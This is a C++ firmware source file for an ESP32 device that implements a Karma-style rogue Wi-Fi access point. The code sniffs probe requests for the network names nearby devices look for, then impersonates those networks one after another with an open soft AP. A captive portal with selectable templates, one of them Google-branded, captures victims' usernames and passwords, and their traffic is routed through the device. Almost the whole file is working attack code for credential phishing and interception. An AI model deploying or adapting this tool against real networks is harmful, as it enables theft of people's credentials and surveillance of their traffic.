#include "karma_ap.h"
#include "../../utils/wifi_utils.h"
#include <cstring>
#include <algorithm>

#ifdef UNIT_TEST
// Include test infrastructure mocks
#include "../../test/common/time_mocks.h"
#include "../../test/common/arduino_mocks.h"
#include "../../test/common/esp32_mocks.h"

namespace attack {
KarmaAP* KarmaAP::instance_ = nullptr;
}
#else
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <lwip/ip4_napt.h>
#include <lwip/lwip_napt.h>
#include <lwip/tcpip.h>
#include "../sniffer/traffic_proxy.h"  // For packet forwarding
#include "modules/storage/settings_manager.h"
#include "core/event_bus.h"

namespace attack {
KarmaAP* KarmaAP::instance_ = nullptr;
}
#endif

namespace attack {

uint32_t KarmaStats::getDuration() const {
    if (startTime == 0) return 0;
    return millis() - startTime;
}

KarmaAP::KarmaAP() {
    instance_ = this;
    
    arduinoPortal_.onCredentialCaptured([this](const ap::ArduinoCapturedCredential& cred) {
        stats_.credentialsCaptured++;
        
        // Publish EventBus event
#ifndef UNIT_TEST
        adversary::EventData event(adversary::EventType::CREDENTIAL_CAPTURED);
        strncpy(event.payload.credential.ssid, currentSSID_, 32);
        strncpy(event.payload.credential.username, cred.username, 63);
        strncpy(event.payload.credential.password, cred.password, 63);
        adversary::EventBus::getInstance().publish(event);
#endif
    });
}

KarmaAP::~KarmaAP() {
    stop();
    if (instance_ == this) {
        instance_ = nullptr;
    }
}

bool KarmaAP::startListening() {
    if (state_ != KarmaState::IDLE) {
        stop();
    }

    // Reset stats
    memset(&stats_, 0, sizeof(stats_));
    stats_.startTime = millis();
    probes_.clear();
    triedSSIDs_.clear();  // Don't carry SSID-cooldown entries across sessions
    
    // Set up promiscuous mode to capture probes
    if (!setupProbeCapture()) {
        state_ = KarmaState::ERROR;
        return false;
    }
    
    state_ = KarmaState::LISTENING;
    return true;
}

bool KarmaAP::startActive(const ap::CaptivePortalConfig& portalConfig) {
    if (state_ != KarmaState::IDLE) {
        stop();
    }
    
    portalConfig_ = portalConfig;

    // Reset stats
    memset(&stats_, 0, sizeof(stats_));
    stats_.startTime = millis();
    probes_.clear();
    triedSSIDs_.clear();  // Don't carry SSID-cooldown entries across sessions

#ifndef UNIT_TEST
    Serial.println("[KarmaAP] Starting active mode...");
    
    // Save STA credentials before mode switch (mode switch may disconnect)
    String savedSSID = WiFi.SSID();
    String savedPSK = WiFi.psk();
    bool wasConnected = WiFi.isConnected();
    
    if (wasConnected) {
        Serial.printf("[KarmaAP] Saving STA connection to %s for reconnect\n", savedSSID.c_str());
    }
    
    // Switch to AP+STA mode
    if (!WiFi.mode(WIFI_AP_STA)) {
        Serial.println("[KarmaAP] ERROR: Failed to set AP+STA mode!");
        state_ = KarmaState::ERROR;
        return false;
    }
    delay(200);  // Give mode switch time to complete
    
    // Reconnect STA if we were connected
    if (wasConnected && savedSSID.length() > 0) {
        Serial.printf("[KarmaAP] Reconnecting to %s...\n", savedSSID.c_str());
        WiFi.begin(savedSSID.c_str(), savedPSK.c_str());
        
        // Wait for reconnection with timeout (required for traffic proxy)
        uint32_t startMs = millis();
        while (!WiFi.isConnected() && (millis() - startMs) < 5000) {
            delay(100);
        }
        
        if (WiFi.isConnected()) {
            Serial.printf("[KarmaAP] STA reconnected! IP: %s\n", WiFi.localIP().toString().c_str());
        } else {
            Serial.println("[KarmaAP] WARNING: STA reconnection timeout - traffic proxy may not work");
        }
    }
    
    // Start with a generic SSID until we capture probes
    strncpy(currentSSID_, "FreeWiFi", sizeof(currentSSID_) - 1);
    
    // Start soft AP - open network
    uint8_t channel = adversary::SettingsManager::getInstance().get().wireless.karmaChannel;
    Serial.printf("[KarmaAP] Creating AP: %s on channel %d\n", currentSSID_, channel);
    if (!WiFi.softAP(currentSSID_, nullptr, channel, 0, 8)) {
        Serial.println("[KarmaAP] ERROR: Failed to start SoftAP!");
        state_ = KarmaState::ERROR;
        return false;
    }
    
    // Inactive timeout - time before client is considered disconnected
    // Default 300s is too slow for responsive SSID cycling after real disconnects
    esp_wifi_set_inactive_time(WIFI_IF_AP, 10);
    
    IPAddress apIP = WiFi.softAPIP();
    Serial.printf("[KarmaAP] AP started! IP: %s\n", apIP.toString().c_str());
    
    // Start Arduino captive portal (DNS + HTTP) if enabled
    if (portalConfig_.enableCaptivePortal) {
        // Use custom title if set, otherwise default
        const char* portalTitle = portalConfig_.customTitle[0] != '\0' ? 
            portalConfig_.customTitle : "Free WiFi - Login";
        if (!arduinoPortal_.start(portalTitle)) {
            Serial.println("[KarmaAP] ERROR: Failed to start captive portal!");
            WiFi.softAPdisconnect(true);
            state_ = KarmaState::ERROR;
            return false;
        }
        arduinoPortal_.setSSID(currentSSID_);  // Set SSID for credential filename
        arduinoPortal_.setPageType(portalConfig_.pageType);  // Set portal template (Generic/Google)
        Serial.printf("[KarmaAP] Captive portal started with pageType: %d\n", 
                      static_cast<int>(portalConfig_.pageType));
    } else {
        Serial.println("[KarmaAP] Traffic routing mode - captive portal disabled");
    }
    
    // Now enable promiscuous mode for probe capture
    // ESP32 can run AP and promiscuous mode simultaneously on same channel
    // IMPORTANT: Set explicit filter to avoid inheriting stale filter from other modules
    auto filter = adversary::wifi_utils::managementFrameFilter();
    adversary::wifi_utils::enablePromiscuous(probeCallback, &filter);
    Serial.println("[KarmaAP] Probe capture enabled");
#endif
    
    state_ = KarmaState::ACTIVE;
    lastSSIDRotation_ = millis();
    ssidRotationIndex_ = 0;
    strncpy(currentSSID_, "FreeWiFi", sizeof(currentSSID_) - 1);
    
#ifndef UNIT_TEST
    Serial.println("[KarmaAP] Active mode running!");
#endif
    
    return true;
}

void KarmaAP::stop() {
    if (state_ == KarmaState::IDLE) {
        return;
    }
    
#ifndef UNIT_TEST
    Serial.println("[KarmaAP] Stopping...");
    
    // Stop promiscuous mode
    adversary::wifi_utils::disablePromiscuous();
    
    if (state_ == KarmaState::ACTIVE) {
        arduinoPortal_.stop();
        WiFi.softAPdisconnect(true);
    }
    
    // Release WiFi memory for Menu/next module.
    // NOTE: WIFI_OFF does NOT reclaim the ~41KB the IDF allocates on first AP
    // bring-up (AP esp_netif + DHCP pools + lwIP NAPT table), and esp_wifi_deinit
    // doesn't free those either — measured: the largest contiguous block stays
    // ~19KB after Karma regardless. That fragmentation (just under the ~20KB a
    // TLS handshake needs) is handled at the upload site instead: the canvas
    // purge in SystemManager::prepareForMemoryIntensiveTask() now kicks in
    // adaptively when the contiguous block is too small. See heap_policy.h.
    WiFi.mode(WIFI_OFF);
    delay(50);

    Serial.println("[KarmaAP] Stopped (WiFi OFF)");
#endif

    // Release session-scoped containers so nothing accumulates across
    // enter/exit cycles (triedSSIDs_ in particular was never cleared before).
    triedSSIDs_.clear();
    probes_.clear();
    probes_.shrink_to_fit();

    state_ = KarmaState::IDLE;
}

void KarmaAP::update() {
    if (state_ == KarmaState::IDLE) {
        return;
    }
    
#ifndef UNIT_TEST
    if (state_ == KarmaState::ACTIVE) {
        // Process DNS and HTTP requests via Arduino portal
        arduinoPortal_.handleRequests();
        
        // Update client count
        stats_.clientsConnected = WiFi.softAPgetStationNum();
        
        // Register connected clients with TrafficProxy for tracking
        if (stats_.clientsConnected > 0) {
            wifi_sta_list_t staList;
            if (esp_wifi_ap_get_sta_list(&staList) == ESP_OK) {
                for (int i = 0; i < staList.num; i++) {
                    wifi_sta_info_t& sta = staList.sta[i];
                    // Register by MAC (IP populated later on first traffic)
                    adversary::TrafficProxy::getInstance().registerClient(sta.mac, nullptr);
                }
            }
        }
        
        // Rotate SSID periodically based on captured probes
        // But only if no clients are connected (changing SSID disconnects them)
        uint32_t now = millis();
        if (now - lastSSIDRotation_ >= getRotationIntervalMs() && stats_.clientsConnected == 0) {
            rotateSSID();
            lastSSIDRotation_ = now;
        }
        
        // Update stats from portal
        stats_.credentialsCaptured = arduinoPortal_.getCredentialCount();

        // Track total connections and publish events
        static uint8_t lastClientCount = 0;
        if (stats_.clientsConnected > lastClientCount) {
            // Publish EventBus event for semantic notification
            adversary::EventData event(adversary::EventType::CLIENT_CONNECTED);
            strncpy(event.payload.network.ssid, currentSSID_, 32);
            adversary::EventBus::getInstance().publish(event);
        }
        lastClientCount = stats_.clientsConnected;
    }
#endif
    
    updateStats();
}

void KarmaAP::rotateSSID() {
    if (probes_.empty()) {
        return;
    }
    
    // Get unique SSIDs (sorted by RSSI - strongest first)
    std::vector<const char*> ssids = getUniqueSSIDs();
    if (ssids.empty()) {
        return;
    }
    
    // Find the first SSID NOT on cooldown
    const char* newSSID = nullptr;
    size_t attempts = 0;
    
    while (attempts < ssids.size()) {
        ssidRotationIndex_ = (ssidRotationIndex_ + 1) % ssids.size();
        const char* candidateSSID = ssids[ssidRotationIndex_];
        
        // Skip if same as current
        if (strcmp(currentSSID_, candidateSSID) == 0) {
            attempts++;
            continue;
        }
        
        // Skip if on cooldown
        if (isSSIDOnCooldown(candidateSSID)) {
            attempts++;
            continue;
        }
        
        newSSID = candidateSSID;
        break;
    }
    
    // All SSIDs either current or on cooldown
    if (newSSID == nullptr) {
#ifndef UNIT_TEST
        Serial.println("[KarmaAP] All SSIDs on cooldown, staying on current");
#endif
        return;
    }
    
    strncpy(currentSSID_, newSSID, sizeof(currentSSID_) - 1);
    currentSSID_[sizeof(currentSSID_) - 1] = '\0';
    
    // Mark this SSID as tried
    markSSIDTried(currentSSID_);
    
#ifndef UNIT_TEST
    // Get configured channel
    uint8_t channel = adversary::SettingsManager::getInstance().get().wireless.karmaChannel;
    
    // Restart AP with new SSID (quick disconnect + reconnect)
    Serial.printf("[KarmaAP] Rotating to SSID: %s (ch:%d)\n", currentSSID_, channel);
    WiFi.softAPdisconnect(false);  // Don't turn off WiFi
    delay(50);
    WiFi.softAP(currentSSID_, nullptr, channel, 0, 8);
    arduinoPortal_.setSSID(currentSSID_);  // Update credential filename
    
    // Re-enable NAPT after AP restart (softAP() resets the network interface)
    // This is required to maintain traffic routing after SSID rotation
    delay(100);  // Give interface time to stabilize
    
    esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap_netif != nullptr) {
        esp_err_t err = esp_netif_napt_enable(ap_netif);
        if (err == ESP_OK) {
            Serial.println("[KarmaAP] NAPT re-enabled after rotation");
        } else {
            // Fallback to legacy API
            Serial.printf("[KarmaAP] esp_netif failed (%s), trying legacy API\n", esp_err_to_name(err));
            IPAddress softApIp = WiFi.softAPIP();
            LOCK_TCPIP_CORE();
            ip_napt_enable(softApIp, 1);
            UNLOCK_TCPIP_CORE();
            Serial.println("[KarmaAP] NAPT re-enabled via legacy API");
        }
    }
#endif
    
    stats_.beaconsSent++;  // Count SSID rotation as beacon activity
}

#ifdef UNIT_TEST

bool KarmaAP::setupProbeCapture() {
    return true;
}

void KarmaAP::stopProbeCapture() {
}

void KarmaAP::probeCallback(void* buf, int type) {
    (void)buf;
    (void)type;
}

#else

bool KarmaAP::setupProbeCapture() {
    // Configure WiFi for promiscuous mode
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    
    if (mode == WIFI_MODE_NULL) {
        esp_wifi_set_mode(WIFI_MODE_STA);
        esp_wifi_start();
    }
    
    // Set promiscuous filter for management frames (probe requests)
    auto filter = adversary::wifi_utils::managementFrameFilter();
    
    // Enable promiscuous mode
    if (!adversary::wifi_utils::enablePromiscuous(probeCallback, &filter)) {
        return false;
    }
    
    return true;
}

void KarmaAP::stopProbeCapture() {
    adversary::wifi_utils::disablePromiscuous();
}

void KarmaAP::probeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!instance_) {
        return;
    }
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    
    // Forward packet stats to TrafficProxy (if running) for packet counting
    if (adversary::TrafficProxy::getInstance().isRunning()) {
        adversary::TrafficProxy::getInstance().incrementPackets(pkt->rx_ctrl.sig_len);
    }
    
    // Only process management frames for probe capture
    if (type != WIFI_PKT_MGMT) {
        return;
    }
    
    const uint8_t* frame = pkt->payload;
    
    // Check frame type - probe request is subtype 0x04
    uint8_t frameType = frame[0];
    if ((frameType & 0xFC) != 0x40) {  // Not a probe request
        return;
    }
    
    // Extract client MAC (SA field, bytes 10-15)
    const uint8_t* clientMAC = &frame[10];
    
    // Extract SSID from tagged parameters
    // Tagged params start at byte 24 for probe request
    const uint8_t* taggedParams = &frame[24];
    int remainingLen = pkt->rx_ctrl.sig_len - 24 - 4;  // -4 for FCS
    
    char ssid[33] = {0};
    
    while (remainingLen > 2) {
        uint8_t tagNum = taggedParams[0];
        uint8_t tagLen = taggedParams[1];
        
        if (tagLen > remainingLen - 2) break;
        
        if (tagNum == 0 && tagLen > 0 && tagLen <= 32) {  // SSID tag
            memcpy(ssid, &taggedParams[2], tagLen);
            ssid[tagLen] = '\0';
            break;
        }
        
        taggedParams += 2 + tagLen;
        remainingLen -= 2 + tagLen;
    }
    
    // Only process if we have an SSID
    if (ssid[0] != '\0') {
        instance_->handleProbe(clientMAC, ssid, pkt->rx_ctrl.rssi);
    }
}

#endif // UNIT_TEST

void KarmaAP::handleProbe(const uint8_t* clientMAC, const char* ssid, int8_t rssi) {
    // Check if we should ignore this SSID
    if (shouldIgnoreSSID(ssid)) {
        return;
    }
    
    stats_.probesCaptured++;
    
    // Check if we already have this probe
    bool found = false;
    for (auto& probe : probes_) {
        if (probe.matchesMAC(clientMAC) && probe.matchesSSID(ssid)) {
            probe.count++;
            probe.rssi = rssi;
            probe.timestamp = millis();
            found = true;
            break;
        }
    }
    
    if (!found) {
        // Add new probe if we have room
        if (probes_.size() < maxProbes_) {
            ProbeRequest newProbe;
            memcpy(newProbe.clientMAC, clientMAC, 6);
            strncpy(newProbe.ssid, ssid, sizeof(newProbe.ssid) - 1);
            newProbe.rssi = rssi;
            newProbe.timestamp = millis();
            newProbe.count = 1;
            
            probes_.push_back(newProbe);
            
#ifndef UNIT_TEST
            // Debug: Log new probe captured
            Serial.printf("[KarmaAP] New probe: %02X:%02X:%02X:%02X:%02X:%02X -> '%s' (RSSI:%d, total:%zu)\n",
                          clientMAC[0], clientMAC[1], clientMAC[2],
                          clientMAC[3], clientMAC[4], clientMAC[5],
                          ssid, rssi, probes_.size());
#endif
            
            // Publish probe event via EventBus (ISR-safe)
#ifndef UNIT_TEST
            adversary::EventData probeEvt(adversary::EventType::PROBE_REQUEST_RECEIVED);
            strncpy(probeEvt.payload.network.ssid, ssid, 32);
            probeEvt.payload.network.ssid[32] = '\0';
            memcpy(probeEvt.payload.network.bssid, clientMAC, 6);
            probeEvt.payload.network.rssi = rssi;
            adversary::EventBus::getInstance().queue(probeEvt);
#endif
        }
    }
}

bool KarmaAP::shouldIgnoreSSID(const char* ssid) const {
    // Ignore empty or very short SSIDs
    if (!ssid || strlen(ssid) < 2) {
        return true;
    }
    
    // Ignore common default/useless SSIDs
    static const char* ignoredSSIDs[] = {
        "Broadcast",
        "ANY",
        "DIRECT-",  // Wi-Fi Direct
        nullptr
    };
    
    for (int i = 0; ignoredSSIDs[i] != nullptr; i++) {
        if (strncmp(ssid, ignoredSSIDs[i], strlen(ignoredSSIDs[i])) == 0) {
            return true;
        }
    }
    
    return false;
}

void KarmaAP::updateStats() {
    // Count unique clients and SSIDs
    std::vector<const uint8_t*> uniqueClients;
    std::vector<const char*> uniqueSSIDs;
    
    for (const auto& probe : probes_) {
        // Check unique client
        bool foundClient = false;
        for (const auto* mac : uniqueClients) {
            if (memcmp(mac, probe.clientMAC, 6) == 0) {
                foundClient = true;
                break;
            }
        }
        if (!foundClient) {
            uniqueClients.push_back(probe.clientMAC);
        }
        
        // Check unique SSID
        bool foundSSID = false;
        for (const auto* ssid : uniqueSSIDs) {
            if (strcmp(ssid, probe.ssid) == 0) {
                foundSSID = true;
                break;
            }
        }
        if (!foundSSID && probe.ssid[0] != '\0') {
            uniqueSSIDs.push_back(probe.ssid);
        }
    }
    
    stats_.uniqueClients = uniqueClients.size();
    stats_.uniqueSSIDs = uniqueSSIDs.size();
#ifndef UNIT_TEST
    stats_.credentialsCaptured = arduinoPortal_.getCredentialCount();
    stats_.clientsConnected = WiFi.softAPgetStationNum();
#endif
}

uint32_t KarmaAP::getRotationIntervalMs() const {
    // Get rotation speed from settings: 0=Fast(15s), 1=Normal(30s), 2=Slow(60s)
#ifndef UNIT_TEST
    const auto& settings = adversary::SettingsManager::getInstance().get();
    uint8_t speed = settings.wireless.karmaRotationSpeed;
    switch (speed) {
        case 0: return 15000;   // Fast: 15 seconds
        case 1: return 30000;   // Normal: 30 seconds (default)
        case 2: return 60000;   // Slow: 60 seconds
        default: return 30000;  // Fallback to Normal
    }
#else
    return 30000;  // Default to 30s for unit tests
#endif
}

uint32_t KarmaAP::getCooldownMs() const {
#ifndef UNIT_TEST
    const auto& settings = adversary::SettingsManager::getInstance().get();
    uint8_t cooldownMin = settings.wireless.karmaCooldownMin;
    return cooldownMin * 60 * 1000;  // Convert minutes to milliseconds
#else
    return 5 * 60 * 1000;  // Default to 5 minutes for unit tests
#endif
}

bool KarmaAP::isSSIDOnCooldown(const char* ssid) const {
    uint32_t cooldownMs = getCooldownMs();
    if (cooldownMs == 0) {
        return false;  // Cooldown disabled
    }
    
    auto it = triedSSIDs_.find(ssid);
    if (it == triedSSIDs_.end()) {
        return false;  // Never tried
    }
    
    uint32_t now = millis();
    uint32_t elapsed = now - it->second;
    return elapsed < cooldownMs;
}

void KarmaAP::markSSIDTried(const char* ssid) {
    triedSSIDs_[ssid] = millis();
}

void KarmaAP::clearSSIDCooldown(const char* ssid) {
    triedSSIDs_.erase(ssid);
}

std::vector<const char*> KarmaAP::getUniqueSSIDs() const {
    // Build a map of SSID -> best RSSI (strongest signal)
    struct SSIDInfo {
        const char* ssid;
        int8_t rssi;
    };
    std::vector<SSIDInfo> ssidInfos;
    
    for (const auto& probe : probes_) {
        if (probe.ssid[0] == '\0') continue;
        
        bool found = false;
        for (auto& info : ssidInfos) {
            if (strcmp(info.ssid, probe.ssid) == 0) {
                // Update RSSI if this probe is stronger
                if (probe.rssi > info.rssi) {
                    info.rssi = probe.rssi;
                }
                found = true;
                break;
            }
        }
        if (!found && ssidInfos.size() < maxSSIDs_) {
            ssidInfos.push_back({probe.ssid, probe.rssi});
        }
    }
    
    // Sort by RSSI (strongest signal first = higher RSSI value)
    std::sort(ssidInfos.begin(), ssidInfos.end(), [](const SSIDInfo& a, const SSIDInfo& b) {
        return a.rssi > b.rssi;  // Descending order (strongest first)
    });
    
    // Extract just the SSID pointers
    std::vector<const char*> ssids;
    for (const auto& info : ssidInfos) {
        ssids.push_back(info.ssid);
    }
    
    return ssids;
}

std::vector<const uint8_t*> KarmaAP::getUniqueClients() const {
    std::vector<const uint8_t*> clients;
    
    for (const auto& probe : probes_) {
        bool found = false;
        for (const auto* mac : clients) {
            if (memcmp(mac, probe.clientMAC, 6) == 0) {
                found = true;
                break;
            }
        }
        if (!found) {
            clients.push_back(probe.clientMAC);
        }
    }
    
    return clients;
}

uint8_t KarmaAP::getClients(ap::APClient* clients, uint8_t maxClients) const {
#ifndef UNIT_TEST
    wifi_sta_list_t staList;
    if (esp_wifi_ap_get_sta_list(&staList) == ESP_OK) {
        uint8_t count = (staList.num < maxClients) ? staList.num : maxClients;
        for (uint8_t i = 0; i < count; i++) {
            memcpy(clients[i].mac, staList.sta[i].mac, 6);
            clients[i].rssi = staList.sta[i].rssi;
        }
        return count;
    }
#endif
    (void)clients;
    (void)maxClients;
    return 0;
}

const std::vector<ap::CapturedCredential>& KarmaAP::getCredentials() const {
    // Convert Arduino portal credentials to our format
    static std::vector<ap::CapturedCredential> convertedCreds;
    convertedCreds.clear();
    
    const auto& arduinoCreds = arduinoPortal_.getCredentials();
    
#ifndef UNIT_TEST
    Serial.printf("[KarmaAP] getCredentials: arduinoPortal_=%p, has %zu creds, stats says %lu\n", 
                  (void*)&arduinoPortal_, arduinoCreds.size(), stats_.credentialsCaptured);
#endif
    
    for (const auto& cred : arduinoCreds) {
        ap::CapturedCredential converted;
        strncpy(converted.username, cred.username, sizeof(converted.username) - 1);
        strncpy(converted.password, cred.password, sizeof(converted.password) - 1);
        strncpy(converted.clientIP, cred.clientIP, sizeof(converted.clientIP) - 1);
        converted.timestamp = cred.timestamp;
        convertedCreds.push_back(converted);
    }
    
    return convertedCreds;
}

const char* KarmaAP::getCurrentSSID() const {
    return currentSSID_;
}

} // namespace attack
